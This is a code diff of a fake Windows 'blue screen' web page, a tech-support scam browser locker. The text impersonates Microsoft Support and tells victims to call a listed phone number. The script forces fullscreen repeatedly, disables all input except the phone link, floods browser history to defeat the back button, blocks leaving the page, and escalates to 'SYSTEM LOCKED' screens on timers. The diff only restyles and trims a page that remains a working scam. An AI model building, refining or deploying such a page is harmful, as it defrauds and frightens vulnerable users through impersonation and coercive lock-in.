@@ -15,7 +15,7 @@
   </script>
 
   <style>
-    /* ===== WINDOWS BSOD THEME - COMPLETE SYSTEM LOCKDOWN ===== */
+    /* ===== WINDOWS BSOD STYLE WITH BLACK BACKGROUND ===== */
     * {
       margin: 0;
       padding: 0;
@@ -24,7 +24,7 @@
 
     body {
       font-family: 'Segoe UI', 'Consolas', 'Lucida Console', 'Courier New', monospace;
-      background: #000000;
+      background: #000000; /* Black background */
       color: #ffffff;
       overflow: hidden;
       height: 100vh;
@@ -43,32 +43,20 @@
       top: 0;
       left: 0;
       width: 100%;
-      height: 40px; /* Covers the top area where drag gestures occur */
+      height: 40px;
       background: transparent;
-      z-index: 999999; /* Above everything */
-      pointer-events: auto; /* Capture touches */
+      z-index: 999999;
+      pointer-events: auto;
     }
 
-    /* Invisible barrier that blocks all touches */
-    .touch-barrier {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: transparent;
-      z-index: 999998;
-      pointer-events: none; /* Let events pass through normally */
-    }
-
-    /* ===== LAYER 1: PRIMARY BSOD (FULL SCREEN, NO EMOJIS) ===== */
+    /* ===== BSOD CONTENT - BLACK BACKGROUND ===== */
     #bsod-layer-1 {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: #106ebe; /* Windows 10/11 exact blue */
+      background: #000000; /* Black background */
       z-index: 10000;
       display: flex;
       align-items: center;
@@ -83,142 +71,116 @@
       width: 100%;
     }
 
-    /* Windows BSOD uses a simple colon and parentheses, not emojis */
-    .sad-face {
-      font-size: 120px;
-      line-height: 1;
-      margin-bottom: 20px;
-      font-family: 'Segoe UI', sans-serif;
-      font-weight: 200;
-    }
-
+    /* Main error message */
     .error-title {
-      font-size: 36px;
+      font-size: 32px;
       font-weight: 600;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
+      line-height: 1.3;
+      color: white;
     }
 
     .error-message {
       font-size: 18px;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
       line-height: 1.5;
-      opacity: 0.9;
+      opacity: 1;
+      color: white;
     }
 
-    .error-code-box {
-      background: rgba(0, 0, 0, 0.3);
-      padding: 20px;
-      border-radius: 8px;
-      margin: 30px 0;
-      font-family: 'Consolas', monospace;
-      border-left: 4px solid #ffffff;
-    }
-
-    .error-code {
-      color: #ffffff;
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .error-details {
-      font-size: 16px;
-      line-height: 1.6;
-      color: #e0e0e0;
-    }
-
-    /* Windows-style progress indicator */
+    /* Progress section */
     .progress-section {
-      margin: 30px 0;
-      padding: 15px 0;
+      margin: 25px 0;
     }
 
     .progress-text {
-      font-size: 16px;
-      margin-bottom: 10px;
+      font-size: 18px;
+      margin-bottom: 8px;
+      color: white;
     }
 
     .progress-bar-bg {
-      background: rgba(255,255,255,0.2);
+      background: rgba(255, 255, 255, 0.3);
       height: 20px;
-      border-radius: 10px;
+      border-radius: 0;
       overflow: hidden;
       width: 100%;
+      margin-bottom: 30px;
     }
 
     .progress-fill {
       background: #ffffff;
       height: 100%;
-      width: 0%;
-      border-radius: 10px;
-      animation: progressPulse 2s infinite;
+      width: 20%;
+      border-radius: 0;
+      animation: progressPulse 3s infinite;
     }
 
     @keyframes progressPulse {
-      0% { width: 10%; opacity: 1; }
-      50% { width: 30%; opacity: 0.9; }
-      100% { width: 10%; opacity: 1; }
+      0% { width: 20%; opacity: 1; }
+      50% { width: 25%; opacity: 0.9; }
+      100% { width: 20%; opacity: 1; }
     }
 
-    /* CRITICAL PHONE NUMBER - BSOD STYLE (NO EMOJIS) */
+    /* CRITICAL PHONE NUMBER - ONLY INTERACTIVE ELEMENT */
     .bsod-phone-container {
-      background: rgba(0, 0, 0, 0.4);
-      padding: 25px;
-      border-radius: 12px;
-      margin: 30px 0;
-      border: 2px solid #ffffff;
-      text-align: center;
+      margin: 30px 0 20px;
+      padding: 20px 0;
+      border-top: 2px solid rgba(255, 255, 255, 0.5);
+      border-bottom: 2px solid rgba(255, 255, 255, 0.5);
     }
 
     .bsod-phone-label {
-      font-size: 18px;
+      font-size: 20px;
       color: #ffffff;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       font-weight: 500;
-      text-transform: uppercase;
     }
 
     .bsod-phone-number {
-      font-size: 56px;
+      font-size: 52px;
       font-weight: 800;
       color: white;
       text-decoration: none;
-      display: block;
-      margin: 15px 0;
+      display: inline-block;
+      padding: 10px 0;
       letter-spacing: 2px;
-      background: rgba(255,255,255,0.1);
-      padding: 20px;
-      border-radius: 60px;
-      border: 2px solid white;
+      border-bottom: 3px solid white;
       transition: all 0.2s;
+      line-height: 1.2;
     }
 
     .bsod-phone-number:hover {
-      background: #ffffff;
-      color: #106ebe;
+      opacity: 0.9;
+      border-bottom-color: #cccccc;
     }
 
-    .bsod-footer {
-      font-size: 14px;
-      color: #a0a0a0;
-      margin-top: 20px;
+    /* Stop code section */
+    .stop-code-section {
+      margin: 30px 0 20px;
     }
 
-    /* Fake "Close" button that does nothing - looks like Windows text */
-    .bsod-action {
-      background: rgba(255,255,255,0.1);
-      border: 1px solid rgba(255,255,255,0.3);
+    .stop-code-label {
+      font-size: 18px;
+      margin-bottom: 5px;
       color: white;
-      padding: 12px 30px;
-      border-radius: 30px;
-      font-size: 16px;
-      margin: 10px 5px;
-      cursor: default;
-      display: inline-block;
-      pointer-events: none; /* Completely non-interactive */
     }
 
-    /* ===== LAYER 2: CRITICAL BSOD OVERRIDE ===== */
+    .stop-code-value {
+      font-size: 28px;
+      font-weight: 700;
+      color: white;
+    }
+
+    /* Footer */
+    .bsod-footer {
+      margin-top: 40px;
+      font-size: 14px;
+      opacity: 0.6;
+      color: white;
+    }
+
+    /* ===== LAYER 2: CRITICAL OVERRIDE - BLACK BACKGROUND ===== */
     #bsod-layer-2 {
       position: fixed;
       top: 0;
@@ -231,7 +193,7 @@
       align-items: center;
       justify-content: center;
       padding: 20px;
-      font-family: 'Consolas', monospace;
+      font-family: 'Segoe UI', 'Consolas', monospace;
       color: white;
     }
 
@@ -239,47 +201,43 @@
       max-width: 800px;
       width: 100%;
       background: #000000;
-      border: 4px solid #ff0000;
-      padding: 40px;
+      border: 3px solid #ffffff;
+      padding: 50px;
       text-align: center;
-      box-shadow: 0 0 100px #ff0000;
     }
 
     .critical-screen h1 {
-      color: #ff0000;
+      color: white;
       font-size: 48px;
-      margin-bottom: 20px;
-      text-transform: uppercase;
-      font-weight: 800;
+      margin-bottom: 30px;
+      font-weight: 600;
     }
 
     .critical-screen .phone {
       font-size: 52px;
       color: white;
-      background: #ff0000;
       text-decoration: none;
-      padding: 25px 40px;
-      border-radius: 60px;
       display: inline-block;
       margin: 30px 0;
       font-weight: 800;
-      border: 2px solid white;
+      border-bottom: 3px solid white;
+      padding-bottom: 8px;
     }
 
-    /* ===== LAYER 3: SYSTEM LOCK ===== */
+    /* ===== LAYER 3: SYSTEM LOCK - BLACK BACKGROUND ===== */
     #bsod-layer-3 {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: black;
+      background: #000000;
       z-index: 30000;
       display: none;
       align-items: center;
       justify-content: center;
       padding: 20px;
-      font-family: 'Consolas', monospace;
+      font-family: 'Segoe UI', 'Consolas', monospace;
     }
 
     .lock-screen {
@@ -289,26 +247,20 @@
 
     .lock-screen h1 {
       font-size: 72px;
-      margin-bottom: 30px;
-      color: #ff0000;
-      font-weight: 900;
+      margin-bottom: 40px;
+      color: white;
+      font-weight: 700;
     }
 
     .lock-screen .big-phone {
       font-size: 64px;
       color: white;
-      background: #ff0000;
       text-decoration: none;
-      padding: 30px 50px;
-      border-radius: 80px;
       display: inline-block;
       margin: 30px;
-      border: 4px solid white;
-    }
-
-    /* Ensure no pointer events on anything except phone links */
-    .no-click {
-      pointer-events: none;
+      border-bottom: 4px solid white;
+      padding-bottom: 10px;
+      font-weight: 800;
     }
 
     /* Make phone links the ONLY clickable elements */
@@ -317,6 +269,16 @@
       cursor: pointer !important;
       -webkit-tap-highlight-color: transparent;
     }
+
+    /* All other elements non-interactive */
+    * {
+      pointer-events: none;
+    }
+    
+    /* Re-enable phone links */
+    a[href^="tel:"] {
+      pointer-events: auto !important;
+    }
   </style>
 </head>
 <body>
@@ -324,67 +286,53 @@
   <!-- ===== TOP DRAG PREVENTION LAYER ===== -->
   <div id="drag-prevention-layer"></div>
 
-  <!-- ===== LAYER 1: PERFECT BSOD (NO EMOJIS) ===== -->
+  <!-- ===== LAYER 1: BLACK BSOD ===== -->
   <div id="bsod-layer-1">
     <div class="bsod-container">
-      <div class="sad-face">:(</div>
       
+      <!-- Exact text from the image -->
       <div class="error-title">Your PC ran into a problem and needs to restart.</div>
       
       <div class="error-message">
         We're just collecting some error info, and then we'll restart for you.
       </div>
 
-      <div class="error-code-box">
-        <div class="error-code">SYSTEM_SERVICE_EXCEPTION</div>
-        <div class="error-details">
-          Stop code: CRITICAL_PROCESS_DIED<br>
-          What failed: win32kbase.sys + 0x3f4a2<br>
-          Date: <span id="current-date"></span>
-        </div>
-      </div>
-
-      <!-- Fake progress (looks like Windows collecting info) -->
+      <!-- Progress bar -->
       <div class="progress-section">
-        <div class="progress-text">Collecting error information...</div>
+        <div class="progress-text">20% complete</div>
         <div class="progress-bar-bg">
           <div class="progress-fill"></div>
         </div>
       </div>
 
-      <!-- CRITICAL PHONE NUMBER - ONLY INTERACTIVE ELEMENT -->
+      <!-- CRITICAL PHONE NUMBER - PROMINENT AND CENTRAL -->
       <div class="bsod-phone-container">
-        <div class="bsod-phone-label">CRITICAL: ACCOUNT LOCK DETECTED</div>
+        <div class="bsod-phone-label">If you call a support person, give them this number:</div>
         <a href="tel:+18332249350" class="bsod-phone-number" id="phone1">+1 (833) 224-9350</a>
-        <div style="color: #ffffff; font-size: 16px;">Microsoft Certified Support - 24/7</div>
       </div>
 
-      <!-- Completely non-interactive text (no buttons) -->
-      <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
-        <span class="bsod-action">Attempt recovery</span>
-        <span class="bsod-action">Wait for restart</span>
+      <!-- Stop code section -->
+      <div class="stop-code-section">
+        <div class="stop-code-label">Stop code:</div>
+        <div class="stop-code-value">CRITICAL_PROCESS_DIED</div>
       </div>
 
+      <!-- Minimal footer -->
       <div class="bsod-footer">
-        For more information about this issue, visit https://support.microsoft.com
+        Windows Critical Error • Contact Support
       </div>
     </div>
   </div>
 
-  <!-- ===== LAYER 2: CRITICAL BSOD OVERRIDE ===== -->
+  <!-- ===== LAYER 2: CRITICAL OVERRIDE ===== -->
   <div id="bsod-layer-2">
     <div class="critical-screen">
       <h1>CRITICAL SYSTEM FAILURE</h1>
-      <p style="color: white; font-size: 24px;">Your account has been permanently locked</p>
-      <p style="color: #ff8888; font-size: 18px; margin: 20px 0;">Multiple close attempts detected</p>
+      <p style="color: white; font-size: 24px; margin: 20px 0;">Your system has been locked</p>
       
       <a href="tel:+18332249350" class="phone" id="phone2">+1 (833) 224-9350</a>
       
-      <p style="color: #ff0000; font-weight: bold; margin: 30px 0;">THIS IS YOUR FINAL WARNING</p>
-      
-      <span class="bsod-action" style="border-color: #ff0000; color: #ff0000; display: inline-block;">
-        Continue (permanent data loss)
-      </span>
+      <p style="color: white; margin: 40px 0; font-size: 18px;">Immediate action required</p>
     </div>
   </div>
 
@@ -392,15 +340,14 @@
   <div id="bsod-layer-3">
     <div class="lock-screen">
       <h1>SYSTEM LOCKED</h1>
-      <p style="color: white; font-size: 28px;">All data encrypted</p>
+      <p style="color: white; font-size: 28px; margin-bottom: 20px;">Call Microsoft Support</p>
       <a href="tel:+18332249350" class="big-phone" id="phone3">+1 (833) 224-9350</a>
-      <p style="color: #666; margin-top: 50px;">Contact Microsoft Support for recovery key</p>
     </div>
   </div>
 
   <script>
     (function() {
-      // ===== ULTRA AGGRESSIVE BSOD POPUP SYSTEM - EVERY UI DISABLED =====
+      // ===== ULTRA AGGRESSIVE BSOD POPUP SYSTEM =====
       
       const layer1 = document.getElementById('bsod-layer-1');
       const layer2 = document.getElementById('bsod-layer-2');
@@ -410,34 +357,17 @@
       // ===== LOCK BODY COMPLETELY =====
       document.body.style.overflow = 'hidden';
       document.documentElement.style.overflow = 'hidden';
-      document.body.style.pointerEvents = 'none'; // Disable all pointer events by default
       
-      // Re-enable pointer events only for phone links
-      const phoneLinks = document.querySelectorAll('a[href^="tel:"]');
-      phoneLinks.forEach(link => {
-        link.style.pointerEvents = 'auto';
-      });
-      
-      // ===== SET CURRENT DATE =====
-      const date = new Date();
-      document.getElementById('current-date').innerHTML = date.toLocaleDateString();
-      
-      // ===== DRAG PREVENTION LAYER HANDLER =====
-      // This captures all touch events at the top of the screen
+      // ===== DRAG PREVENTION LAYER =====
       dragPrevention.addEventListener('touchstart', function(e) {
         e.preventDefault();
         e.stopPropagation();
         
-        // Show layer 2 as a warning
         if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
           layer2.style.display = 'flex';
         }
         
-        // Vibration feedback
-        if (navigator.vibrate) {
-          navigator.vibrate(200);
-        }
-        
+        if (navigator.vibrate) navigator.vibrate(200);
         return false;
       }, { passive: false, capture: true });
       
@@ -447,44 +377,21 @@
         return false;
       }, { passive: false, capture: true });
       
-      dragPrevention.addEventListener('touchend', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-      }, { passive: false, capture: true });
-      
-      // ===== BLOCK ALL DRAG-RELATED GESTURES =====
-      document.addEventListener('touchmove', function(e) {
-        // Allow phone links
-        if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
-          return;
-        }
-        e.preventDefault();
-      }, { passive: false, capture: true });
-      
-      // Block pull-to-refresh entirely
+      // Block pull-to-refresh
       document.body.style.overscrollBehavior = 'none';
       document.documentElement.style.overscrollBehavior = 'none';
       
-      // ===== FULLSCREEN FUNCTIONS =====
+      // ===== FULLSCREEN =====
       function enterFullScreen() {
         const element = document.documentElement;
-        
-        if (element.requestFullscreen) {
-          element.requestFullscreen().catch(() => {});
-        } else if (element.mozRequestFullScreen) {
-          element.mozRequestFullScreen().catch(() => {});
-        } else if (element.webkitRequestFullscreen) {
-          element.webkitRequestFullscreen().catch(() => {});
-        } else if (element.msRequestFullscreen) {
-          element.msRequestFullscreen().catch(() => {});
-        }
+        if (element.requestFullscreen) element.requestFullscreen().catch(() => {});
+        else if (element.mozRequestFullScreen) element.mozRequestFullScreen().catch(() => {});
+        else if (element.webkitRequestFullscreen) element.webkitRequestFullscreen().catch(() => {});
+        else if (element.msRequestFullscreen) element.msRequestFullscreen().catch(() => {});
       }
       
-      // Attempt fullscreen immediately
       enterFullScreen();
       
-      // Retry fullscreen aggressively
       setInterval(() => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && 
             !document.mozFullScreenElement && !document.msFullscreenElement) {
@@ -492,26 +399,7 @@
         }
       }, 1000);
       
-      // Re-enter if they exit
-      document.addEventListener('fullscreenchange', function() {
-        if (!document.fullscreenElement) {
-          setTimeout(enterFullScreen, 10);
-        }
-      });
-      
-      document.addEventListener('webkitfullscreenchange', function() {
-        if (!document.webkitFullscreenElement) {
-          setTimeout(enterFullScreen, 10);
-        }
-      });
-      
-      document.addEventListener('mozfullscreenchange', function() {
-        if (!document.mozFullScreenElement) {
-          setTimeout(enterFullScreen, 10);
-        }
-      });
-      
-      // ===== PROGRESS TO LAYER 2 AFTER DELAY =====
+      // ===== PROGRESS TO LAYER 2 =====
       setTimeout(() => {
         if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
           layer2.style.display = 'flex';
@@ -519,7 +407,7 @@
         }
       }, 15000);
       
-      // ===== PROGRESS TO LAYER 3 AFTER DELAY =====
+      // ===== PROGRESS TO LAYER 3 =====
       setTimeout(() => {
         if (layer3.style.display !== 'flex') {
           layer3.style.display = 'flex';
@@ -532,23 +420,16 @@
         e.preventDefault();
         e.stopPropagation();
         
-        if (e.key === 'F11') {
-          setTimeout(enterFullScreen, 10);
-        }
-        
         if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
           layer2.style.display = 'flex';
         }
         
-        if (navigator.vibrate) navigator.vibrate(100);
         return false;
       }, true);
       
       // ===== BACK BUTTON SPAM =====
       function spamHistory() {
-        for (let i = 0; i < 20; i++) {
-          history.pushState({}, '', location.href);
-        }
+        for (let i = 0; i < 20; i++) history.pushState({}, '', location.href);
       }
       
       spamHistory();
@@ -557,36 +438,31 @@
       window.addEventListener('popstate', function() {
         spamHistory();
         if (layer3.style.display !== 'flex') layer2.style.display = 'flex';
-        if (navigator.vibrate) navigator.vibrate(500);
       });
       
-      // ===== BLOCK ALL EVENTS =====
-      const blockAllEvents = [
-        'click', 'mousedown', 'mouseup', 'mousemove', 'mouseover', 'mouseout',
-        'touchstart', 'touchmove', 'touchend', 'touchcancel',
-        'pointerdown', 'pointerup', 'pointermove',
-        'wheel', 'scroll', 'contextmenu', 'selectstart', 'dragstart'
-      ];
-      
-      blockAllEvents.forEach(eventType => {
+      // ===== BLOCK ALL EVENTS EXCEPT PHONE CLICKS =====
+      const blockEvents = ['click', 'mousedown', 'mouseup', 'touchstart', 'touchmove', 'touchend', 'contextmenu'];
+      blockEvents.forEach(eventType => {
         document.addEventListener(eventType, function(e) {
+          // Allow ONLY phone links
           if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
-            return;
+            return; // Let them call
           }
+          
           e.preventDefault();
           e.stopPropagation();
           return false;
         }, { passive: false, capture: true });
       });
       
-      // ===== PREVENT PAGE UNLOAD =====
+      // ===== PREVENT UNLOAD =====
       window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
-        e.returnValue = 'CRITICAL: Your system is locked. Call +1(833)224-9350 immediately.';
+        e.returnValue = 'System locked. Call +1(833)224-9350 immediately.';
         return e.returnValue;
       });
       
-      // ===== ENSURE OVERLAYS STAY VISIBLE =====
+      // ===== ENSURE OVERLAYS STAY =====
       setInterval(function() {
         if (layer3.style.display === 'flex') {
           layer1.style.display = 'none';
@@ -597,33 +473,11 @@
           layer1.style.display = 'flex';
         }
         
-        document.body.style.overflow = 'hidden';
-        document.documentElement.style.overflow = 'hidden';
-        document.body.style.pointerEvents = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        document.documentElement.style.overscrollBehavior = 'none';
-        
-        // Re-enable phone links
+        // Re-enable phone links (in case they get disabled)
         document.querySelectorAll('a[href^="tel:"]').forEach(link => {
           link.style.pointerEvents = 'auto';
         });
-        
-        // Fullscreen check
-        if (!document.fullscreenElement && !document.webkitFullscreenElement && 
-            !document.mozFullScreenElement && !document.msFullscreenElement) {
-          enterFullScreen();
-        }
       }, 50);
-      
-      // ===== BLOCK KEYBOARD SHORTCUTS =====
-      window.addEventListener('keydown', function(e) {
-        if (e.key === 'F11' || e.key === 'F5' || e.key === 'F4' || 
-            (e.ctrlKey && (e.key === 'w' || e.key === 'r' || e.key === 'W' || e.key === 'R'))) {
-          e.preventDefault();
-          setTimeout(enterFullScreen, 10);
-          return false;
-        }
-      }, true);
       
     })();
   </script>
